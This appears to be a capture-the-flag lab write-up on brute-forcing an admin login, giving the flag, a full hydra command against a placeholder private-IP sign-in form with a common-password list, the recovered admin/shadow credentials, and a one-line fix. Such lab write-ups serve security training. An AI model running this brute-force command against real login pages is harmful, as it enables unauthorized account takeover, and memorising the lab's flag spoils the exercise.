# Bruteforce Members Credentials

## Flag

B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2

## Description

Reproduce the admin exploit on the members page

## URL

http://192.168.x.y/?page=signin

## Steps To Reproduce

Let's do it fast, payload :
`hydra -t 64 -l admin -P 1000-most-common-passwords.txt 192.168.x.y http-get-form '/:page=signin&username=^USER^&password=^PASS^&Login=Login:Wrong'`
password : [80][http-get-form] host: 192.168.x.y login: admin password: shadow

So we login with admin/shadow as credentials.
As the great Julien lepers would say, along with Daft Punk, "One more time, Oui oui oui !"

## Why is it dangerous ?

Any attacker can impersonate any other user.

## Possible fixes

- Choose a secure password.

## Resources

- [1000-most-common-passwords.txt]()
